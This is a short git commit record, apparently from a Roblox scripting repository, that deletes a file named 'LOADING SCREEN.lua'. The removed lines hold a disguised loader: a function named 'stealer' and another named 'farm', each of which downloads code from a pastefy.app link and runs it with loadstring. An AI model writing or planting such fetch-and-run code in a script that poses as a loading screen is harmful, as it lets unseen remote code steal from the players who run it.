e081843246d9a807b7a6e0abbad61d0cdac91688
corelibs <ssaint3q3v@gmail.com>
2025-09-06 18:57:06 +0800

    Delete LOADING SCREEN.lua

--- LOADING SCREEN.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/4yiGY6ZT/raw"))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://pastefy.app/AJxCbwUN/raw"))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
